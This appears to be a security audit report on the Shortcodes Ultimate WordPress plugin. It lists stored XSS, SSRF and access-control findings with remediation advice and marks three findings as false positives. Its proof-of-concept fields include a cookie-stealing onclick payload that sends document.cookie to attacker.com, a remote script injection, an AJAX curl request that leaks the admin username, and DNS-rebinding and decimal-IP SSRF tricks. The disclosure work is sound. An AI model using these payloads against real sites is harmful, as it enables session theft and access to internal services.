verdicts.title: Shortcode Preview AJAX Executes Arbitrary Shortcodes (Admin-Only by Default, Configurable to Lower Roles)
verdicts.description: The `su_generator_preview` AJAX handler (generator.php:611-630) accepts a raw `$_POST['shortcode']` value and passes it directly to `do_shortcode()` without any sanitization. A valid nonce (`su_generator_preview`) is required. Access is guarded by `self::access()` which calls `current_user_can(get_option('su_option_generator_access', 'manage_options'))`. The default capability is `manage_options` (admin-only). However, the admin settings panel allows this capability to be changed to ANY WordPress capability string including `read` (subscriber level). If an administrator intentionally or inadvertently lowers this to `read` or `edit_posts`, any authenticated user at that level can trigger arbitrary shortcode execution via the AJAX preview endpoint. While this requires admin-level modification of the setting first, the UI description warns 'Do not change this value if you do not understand its meaning' rather than enforcing a minimum capability. The real risk is the attack surface: once lowered, authenticated users can execute ALL registered shortcodes — including [su_user], [su_meta], [su_csv_table] (if unsafe features enabled), and any third-party shortcodes registered site-wide — via a direct AJAX POST.
verdicts.proof_of_concept:
# Step 1: Admin must change Required user capability to 'read' at Settings > Shortcodes Ultimate > Advanced
# Step 2: Log in as Subscriber. Get nonce from front-end page source or by calling su_generator_settings AJAX.
# Step 3:
curl -s -X POST 'https://TARGET/wp-admin/admin-ajax.php' \
  -d 'action=su_generator_preview&nonce=NONCE_VALUE&shortcode=[su_user+field="user_nicename"+user_id="1"]'
# Returns admin username in the preview response.
# With unsafe features on, can also use: shortcode=[su_csv_table+url="http://ATTACKER/data.csv"]
verdicts.remediation: Enforce a minimum capability of `edit_posts` (Author) for the generator_access setting, or add a server-side check that the provided capability is at least as restrictive as `edit_posts`. Optionally, sanitize and restrict what shortcodes can be executed via the preview endpoint (e.g., a whitelist). Also consider adding `check_ajax_referer()` before the access check to ensure nonce failure returns a proper error code.

verdicts.title: Stored XSS via Button Shortcode onclick Attribute (When Unsafe Features Enabled)
verdicts.description: The [su_button] shortcode accepts an `onclick` attribute that is placed directly into the rendered HTML as `onClick="..."` (button.php:382-383). The value is passed through `esc_attr()` which prevents breaking out of the attribute context via quotes/angle brackets, but does NOT prevent JavaScript execution within the attribute value. When `unsafe features` is enabled (the default on new installations), any user who can publish posts with shortcodes (Author role and above) can insert `[su_button onclick="malicious_js_here"]` into post content. This results in Stored XSS visible to all visitors of the affected post. The `unsafe features` setting is auto-disabled when a non-admin user visits the admin area, but this auto-disable fires only once (guarded by `su_option_unsafe_features_auto_off` option) and ONLY if the current user lacks generator-insert capability. On sites where the first admin-area visit after plugin install is always by admins, unsafe features remain ON indefinitely. Since Authors can publish posts directly, this constitutes authenticated Stored XSS requiring no editor approval.
verdicts.proof_of_concept:
# As an Author-level user, create a new post with the following content:
[su_button onclick="fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))"]Click me[/su_button]
# Publish the post. Any visitor clicking the button will have their cookies exfiltrated.
# No-click variant (body onload equivalent via image):
[su_button onclick="document.body.appendChild(Object.assign(document.createElement('script'),{src:'//attacker.com/x.js'}))"]Click[/su_button]
verdicts.remediation: Remove the `onclick` attribute entirely or restrict it to admin-level users only with an explicit capability check (`current_user_can('manage_options')`). The `esc_attr()` wrapper is insufficient for onclick handlers. If onclick must remain for backward compatibility, consider a strict allowlist of safe patterns (e.g., only allow calling named functions, not inline JS). Additionally, reconsider the `unsafe_features` default — it should default to OFF on all installations.

verdicts.title: SSRF via csv_table Shortcode with DNS Rebinding (Requires Unsafe Features Enabled)
verdicts.description: The [su_csv_table] shortcode (csv-table.php:76-163) fetches a remote URL when `unsafe features` is enabled. It attempts to block SSRF by resolving the target hostname with `gethostbyname()` and validating the resulting IP against private/reserved ranges using `FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE`. Additionally it manually checks for `169.254.169.254`, `100.100.100.200`, and `192.0.0.192`. However, there is a Time-of-Check/Time-of-Use (TOCTOU) race condition: the IP is validated at check time, but `wp_safe_remote_get()` performs its own DNS resolution at request time. An attacker who controls a domain can use DNS rebinding (TTL=0, first query returns public IP passing validation, second query returns internal IP for the actual HTTP request). This allows requests to internal services such as cloud metadata APIs, database admin panels, or internal APIs. Note: `wp_safe_remote_get()` itself calls `WP_HTTP::request()` which uses `WP_HTTP::is_ip_address()` and `WP_HTTP::make_absolute_url()` for some protection, but does not independently block DNS rebinding. Exploitation requires attacker control of a domain with low-TTL DNS.
verdicts.proof_of_concept:
# Setup: Control domain attacker.com with DNS server supporting rapid TTL changes
# Configure DNS: attacker.com -> 1.2.3.4 (public IP, TTL=1)
# When query comes in from WordPress server, immediately change: attacker.com -> 192.168.1.1
# As Author, insert into post content:
[su_csv_table url="http://attacker.com/data.csv"]
# The CSV content at 192.168.1.1 is fetched and rendered in the page.
# For cloud environments targeting metadata API:
# Change second DNS response to 169.254.169.254 (noting manual IP check blocks this specific IP)
# but other internal IPs like 10.0.0.1 may be accessible depending on environment
verdicts.remediation: After `gethostbyname()` resolves the IP and validates it, connect to the resolved IP directly (using the IP in the HTTP request, with the Host header set to the original hostname), bypassing any second DNS lookup. Alternatively, use a dedicated SSRF-safe HTTP client library. Also expand the manual IP blocklist to cover all common cloud metadata endpoints (e.g., AWS IMDSv2 at 169.254.169.254/latest/meta-data, GCP at metadata.google.internal, Azure at 169.254.169.254).

verdicts.title: Weak SSRF Filtering in Feed Shortcode (Missing IPv6, Alternative URL Formats)
verdicts.description: The [su_feed] shortcode (feed.php:55-62) attempts to block SSRF with three checks: (1) `strpos($url, '::')` to block IPv6 notation, (2) `strpos($url, 'localhost')` for the localhost keyword, (3) `preg_match('/\d{1,3}\.\d{1,3}\.\d{1,3}/', $url)` to block IP addresses. Check (3) matches only 3 octet groups (e.g., `127.0.0`) which does cover IPv4 addresses since all IPv4 addresses contain at least 3 dot-separated octets. However, the filter does NOT block: (a) alternative decimal IP notation like `http://2130706433/` (integer representation of 127.0.0.1), (b) octal notation `http://0177.0.0.1/`, (c) domain names that resolve to internal IPs (no hostname validation is performed at all — unlike csv_table). The `fetch_feed()` function uses SimplePie which in turn uses WordPress's HTTP API, providing some additional protection, but hostname-to-private-IP resolution is not explicitly checked. An Author-level user (or any user who can publish posts) can use this shortcode to make server-side requests to arbitrary hostnames that resolve to internal services.
verdicts.proof_of_concept:
# As Author, add to post content:
[su_feed url="http://internal-service.local/admin/" limit="5"]
# If internal-service.local resolves to an internal IP, the feed is fetched.
# Alternative format bypass attempt (effectiveness depends on PHP/server):
[su_feed url="http://2130706433/feed.xml" limit="3"]
verdicts.remediation: Add hostname resolution and IP validation similar to the csv_table shortcode: resolve the hostname, validate the resulting IP against private/reserved ranges. Also add a scheme allowlist (only http:// and https://) and block alternative IP notation formats. Optionally gate this shortcode behind the `unsafe_features` setting for consistency.

verdicts.title: Path Traversal in Posts Shortcode Template Attribute - FALSE POSITIVE
verdicts.description: The [su_posts] shortcode accepts a `template` attribute that is used to include a PHP file. Static analysis flagged this as a potential path traversal. However, the `su_shortcode_posts_locate_template()` function (posts.php:439-472) properly mitigates this: (1) it strips leading slashes from the template name, (2) resolves real paths with `realpath()`, (3) only accepts files within an allowlist of directories (theme directory, parent theme directory, plugin's own partials directory), and (4) performs a strict `strpos($path, $base) === 0` prefix check after realpath resolution to prevent any `../` traversal that survives the ltrim. The `file_exists()` check happens after the realpath/prefix validation. This is a well-implemented path restriction. FALSE POSITIVE.
verdicts.proof_of_concept: N/A - Not exploitable. The realpath + strpos prefix check correctly blocks traversal.
verdicts.remediation: No action required. The existing implementation is correct.

verdicts.title: Open Redirect in Notice Dismiss Handler - FALSE POSITIVE (Admin Only + Nonce Protected)
verdicts.description: The `dismiss_notice()` method (class-shortcodes-ultimate-notice.php:137-171) calls `wp_safe_redirect($_GET['redirect_to'])` at line 160. This is guarded by: (1) `$this->current_user_can_view()` which checks `current_user_can('manage_options')` — only admins, (2) presence of both `$_GET['nonce']` and `$_GET['id']`, and (3) a valid nonce via `wp_verify_nonce($_GET['nonce'], 'su_dismiss_notice')`. Furthermore, `wp_safe_redirect()` itself restricts redirects to the same host (with an allowlist). Given that exploitation requires admin privileges and a valid nonce, and that `wp_safe_redirect` limits same-host redirects, this is not a practically exploitable vulnerability. FALSE POSITIVE.
verdicts.proof_of_concept: N/A - Requires admin authentication and valid nonce. wp_safe_redirect limits to same host.
verdicts.remediation: No action required for security. Code is correct as written.

verdicts.title: Freemius SDK: REQUEST_URI in wpdb->insert - FALSE POSITIVE
verdicts.description: The Freemius logger (class-fs-logger.php:394-416) stores `$_SERVER['REQUEST_URI']` in a database column via `$wpdb->insert()`. WordPress's `$wpdb->insert()` method internally calls `$wpdb->prepare()` for each column value, escaping all user-supplied data before constructing the SQL statement. This is NOT a SQL injection vulnerability — `wpdb->insert()` is the safe, parameterized alternative to raw `$wpdb->query()`. The static analysis tool incorrectly flagged `$_SERVER['REQUEST_URI']` flowing into `wpdb->insert()` as SQLi. FALSE POSITIVE.
verdicts.proof_of_concept: N/A - wpdb->insert() uses parameterized queries internally. Not exploitable.
verdicts.remediation: No action required. This is a false positive from static analysis.

verdicts.title: Unsafe Features Enabled by Default — Site-Wide Risk Escalation
verdicts.description: The plugin's `unsafe_features` option defaults to `on` (includes/config/default-settings.php:20). This enables the `onclick` attribute in [su_button] (Stored XSS risk), the `url` attribute in [su_csv_table] (SSRF risk), the `url` attribute in the deprecated [su_table] shortcode, and arbitrary post meta access via [su_meta]. The auto-disable logic (`maybe_disable_unsafe_features()`) only fires when a non-admin user with sufficient capability to view admin notices logs into the admin panel AND only fires once (permanently marking `su_option_unsafe_features_auto_off`). On sites where contributors/authors never log into the admin panel, or on single-admin sites, `unsafe_features` remains ON permanently. This creates a risk window where Author-level users can exploit XSS and SSRF vectors without the admin being aware.
verdicts.proof_of_concept: N/A - Configuration issue enabling su-VULN-002 and su-VULN-003.
verdicts.remediation: Change the default value of `su_option_unsafe_features` to `off`. Require admins to explicitly opt-in to unsafe features with clear documentation of the risks. The auto-disable mechanism is fragile and should be replaced with a requirement that the site admin explicitly enables features on a per-feature basis.

summary: Shortcodes Ultimate presents a mixed security picture. The most significant confirmed vulnerability is Stored XSS via the [su_button] onclick attribute (su-VULN-002, High), which is exploitable by Author-level users on sites where the 'unsafe features' option is enabled (the default). This is compounded by the insecure default configuration (su-VULN-008, Medium). The shortcode preview AJAX handler (su-VULN-001, Medium) is admin-only by default but the access control can be lowered by admins to subscriber-level, enabling arbitrary shortcode execution by low-privileged users. Two SSRF findings exist at Medium/Low severity: the [su_csv_table] shortcode has a DNS rebinding TOCTOU race (su-VULN-003) and the [su_feed] shortcode has incomplete internal IP filtering (su-VULN-004). Three static-analysis-flagged issues are confirmed false positives: the posts template path traversal is properly mitigated with realpath+prefix checks (su-VULN-005), the notice open redirect requires admin+nonce (su-VULN-006), and the Freemius logger uses parameterized wpdb->insert() (su-VULN-007). Priority remediation: fix the onclick XSS (remove or restrict to admins), change unsafe_features default to off, and add hostname validation to the feed shortcode.
